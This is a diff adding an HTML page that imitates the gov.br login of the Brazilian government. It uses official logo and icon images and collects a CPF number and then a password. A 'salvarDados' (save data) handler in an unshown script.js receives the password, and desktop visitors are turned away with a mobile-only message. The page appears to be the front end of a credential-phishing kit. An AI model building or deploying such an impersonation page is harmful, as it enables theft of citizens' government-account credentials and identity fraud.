@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="pt-br">
+<head>
+  <title>gov.br - Acesse sua conta</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="./style.css" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0&icon_names=contrast,id_card,text_increase" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+</head>
+<body>
+
+  <div class="mobile">
+    <header>
+      <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" />
+      <div id="acessibilidade">
+        <span class="material-symbols-outlined">contrast</span>
+        <span class="material-symbols-outlined">text_increase</span>
+      </div>
+    </header>
+
+    <main id="etapaOne">
+      <section id="login">
+        <h2>Identifique-se no gov.br com:</h2>
+        <div id="iconText">
+          <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png" />
+          <p>Número do seu CPF</p>
+        </div>
+        <p style="margin: 13px 0;">Digite seu CPF para criar ou acessar sua conta gov.br</p>
+        <p style="margin: 0 0 5px;"><b>CPF</b></p>
+        <input type="text" placeholder="Digite seu CPF" id="cpf" minlength="14" required />
+        <input class="btn" type="submit" value="continuar" onclick="lets()" />
+        <p style="border-bottom: 1px solid #333; padding-bottom: 5px;">outras opções de identificação:</p>
+
+        <div id="containerOpcoes">
+          <div class="iconText">
+            <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png" />
+            <p>Login com seu banco</p>
+          </div>
+          <div class="iconText">
+            <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/app-identidade-govbr.png" />
+            <p>Seu aplicativo gov.br</p>
+          </div>
+          <div class="iconText">
+            <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD.png" />
+            <p>Seu certificado digital</p>
+          </div>
+          <div class="iconText" style="margin-bottom: 50px;">
+            <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD-Nuvem.png" />
+            <p>Seu certificado digital em nuvem</p>
+          </div>
+        </div>
+
+        <div id="contextFooter">
+          <div class="iconText">
+            <img src="https://sso.acesso.gov.br/assets/govbr/fontawesome/webfonts/circle-question-solid.svg" />
+            <p>Está com dúvidas e precisa de ajuda?</p>
+          </div>
+          <p>Termo de uso e aviso da privacidade</p>
+        </div>
+      </section>
+    </main>
+
+    <main id="etapaTwo">
+      <section id="login">
+        <h2>Digite sua senha</h2>
+        <p style="margin-top: 0 0 5px;"><b>CPF</b></p>
+        <p id="cpfValue" style="margin: 0 0 20px;"><b></b>1111111111</p>
+        <p style="margin: 0 0 5px;"><b>Senha</b></p>
+        <input type="password" placeholder="Digite sua senha atual" id="senha" required />
+        <p style="margin: 12.8px 0 0; color: #1351B4; text-decoration: underline;"><b>Esqueci minha senha</b></p>
+
+        <div id="containerBtns">
+          <input style="background: #FFFFFF 0 0 no-repeat padding-box; color: #1351B4 !important; border: 1px solid #1351B4 !important;" class="btns" type="submit" value="Cancelar" onclick="relogar()" />
+          <input style="background: #1351B4 0 0 no-repeat padding-box;" class="btns" type="submit" value="Entrar" onclick="salvarDados()" />
+        </div>
+      </section>
+      <p style="text-align: center; color: #1351B4; margin-top: 20px; padding: 10px; text-decoration: underline;">Ficou com dúvidas?</p>
+    </main>
+  </div>
+
+  <div class="desktop">
+    <h1>Este site é apenas para dispositivos móveis</h1>
+    <p>Por favor, acesse usando um smartphone.</p>
+  </div>
+
+  <script src="./script.js"></script>
+
+</body>
+</html>
